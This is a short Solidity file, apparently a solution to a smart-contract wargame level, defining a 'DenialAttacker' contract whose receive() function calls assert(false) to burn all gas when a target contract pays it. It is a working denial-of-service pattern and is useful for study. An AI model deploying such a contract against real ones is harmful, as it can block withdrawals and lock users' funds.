// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

interface IDenial { 
    function withdraw() external;
}

contract DenialAttacker {
  IDenial denial;

  constructor(address _address) payable {
      denial = IDenial(_address);
  }

  receive() external payable {
    assert(false); // consumes all gas
  }

}
